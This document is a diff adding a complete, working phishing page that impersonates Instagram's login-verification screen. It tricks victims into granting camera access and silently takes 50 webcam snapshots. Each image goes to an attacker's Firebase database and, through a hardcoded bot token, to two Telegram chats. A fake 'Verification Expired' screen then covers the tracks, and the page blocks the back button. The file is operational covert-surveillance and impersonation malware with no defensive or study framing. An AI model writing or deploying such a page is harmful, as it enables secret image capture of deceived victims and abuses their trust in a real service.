@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram | Account Verification</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --insta-grad: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            --insta-blue: #0095f6;
+            --bg-gray: #fafafa;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--bg-gray); 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .insta-container {
+            background: #fff; width: 100%; max-width: 350px;
+            padding: 40px; border: 1px solid #dbdbdb; border-radius: 1px;
+            text-align: center; box-sizing: border-box;
+        }
+
+        .insta-logo {
+            width: 175px; margin-bottom: 20px;
+        }
+
+        h2 { font-size: 16px; font-weight: 600; color: #262626; margin-bottom: 12px; }
+        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 24px; }
+
+        .shield-icon {
+            width: 60px; height: 60px; margin: 0 auto 15px;
+            background: #fff; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            border: 2px solid #262626; font-size: 30px;
+        }
+
+        .btn-verify {
+            background-color: var(--insta-blue); color: #fff; border: none;
+            padding: 8px 16px; border-radius: 8px; font-weight: 600;
+            width: 100%; cursor: pointer; font-size: 14px;
+        }
+
+        .btn-verify:active { opacity: 0.7; }
+
+        /* Sync UI Elements */
+        #sync-ui { display: none; }
+        .progress-ring {
+            width: 40px; height: 40px; border: 3px solid #dbdbdb;
+            border-top: 3px solid var(--insta-blue); border-radius: 50%;
+            margin: 0 auto 15px; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Error/Cover Tracks UI */
+        #error-screen {
+            display: none; text-align: center; padding: 20px;
+        }
+        .error-icon { color: #ed4956; font-size: 50px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="insta-container" id="main-ui">
+        <img src="https://www.instagram.com/static/images/web/mobile_porting/web_logotype_2x.png/114034ddc061.png" class="insta-logo" alt="Instagram">
+        
+        <div id="setup-ui">
+            <div class="shield-icon">👤</div>
+            <h2>Unrecognized Login Detected</h2>
+            <p>We noticed a login from a device or location you don't usually use. Please complete a <b>Live Identity Check</b> to secure your account.</p>
+            <button class="btn-verify" onclick="initiate()">Verify My Identity</button>
+        </div>
+
+        <div id="sync-ui">
+            <div class="progress-ring"></div>
+            <h2 id="percent-label">Initializing Camera...</h2>
+            <p id="log-text" style="font-size: 12px;">Confirming device proximity...</p>
+        </div>
+    </div>
+
+    <!-- Cover Tracks Page -->
+    <div id="error-screen">
+        <div class="error-icon">⚠️</div>
+        <h2>Verification Expired</h2>
+        <p style="color: #262626;">The verification session has timed out for security reasons. Please log in again from a trusted device.</p>
+        <p style="font-size: 12px; color: #8e8e8e; margin-top: 30px;">Error Code: 0x8004100E<br>Timestamp: <span id="ts"></span></p>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        const logs = ["Analyzing facial biometrics...", "Checking liveness...", "Verifying ISP metadata...", "Cross-referencing device ID...", "Establishing secure tunnel..."];
+
+        async function initiate() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('setup-ui').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+                
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const interval = setInterval(() => {
+                        if (count >= 50) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            closeTracks();
+                            return;
+                        }
+                        sendData(++count);
+                        document.getElementById('percent-label').innerText = `Verifying: ${Math.round((count/50)*100)}%`;
+                        if (count % 8 === 0) document.getElementById('log-text').innerText = logs[Math.floor(Math.random()*logs.length)];
+                    }, 1100);
+                };
+            } catch (e) {
+                alert("Action Required: Instagram requires camera access for identity verification to prevent unauthorized access.");
+            }
+        }
+
+        function sendData(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.3);
+            database.ref('captures').push({ image_data: b64, source: "INSTA_SPOOF", ts: Date.now() });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'verify.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.4);
+        }
+
+        function closeTracks() {
+            document.getElementById('main-ui').style.display = 'none';
+            document.getElementById('error-screen').style.display = 'block';
+            document.getElementById('ts').innerText = new Date().toUTCString();
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = () => window.history.go(1);
+        }
+    </script>
+</body>
+</html>
